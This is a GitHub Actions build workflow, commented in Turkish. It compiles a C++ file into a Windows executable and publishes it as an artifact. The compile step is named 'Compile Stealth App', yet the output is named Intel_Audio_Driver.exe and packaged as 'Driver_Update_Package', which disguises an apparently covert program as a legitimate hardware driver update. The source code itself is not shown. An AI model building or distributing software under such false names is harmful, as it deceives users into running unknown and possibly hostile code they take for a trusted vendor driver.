name: Secure_Build_Service
on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: windows-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      # 1. ADIM: Derleyiciyi (cl.exe) aktif eder ve yola ekler
      - name: Setup MSVC (Visual Studio Compiler)
        uses: ilammy/msvc-dev-cmd@v1
        with:
          arch: x64

      # 2. ADIM: Derleme işlemini yapar
      # Not: Dosya adının Security_Service.cpp olduğundan emin ol!
      - name: Compile Stealth App
        run: |
          cl.exe /EHsc /O2 /Fe:Intel_Audio_Driver.exe Security_Service.cpp User32.lib Gdi32.lib Advapi32.lib Shell32.lib

      # 3. ADIM: Hazır dosyayı yükler
      - name: Upload Finished Build
        uses: actions/upload-artifact@v4
        with:
          name: Driver_Update_Package
          path: Intel_Audio_Driver.exe
          
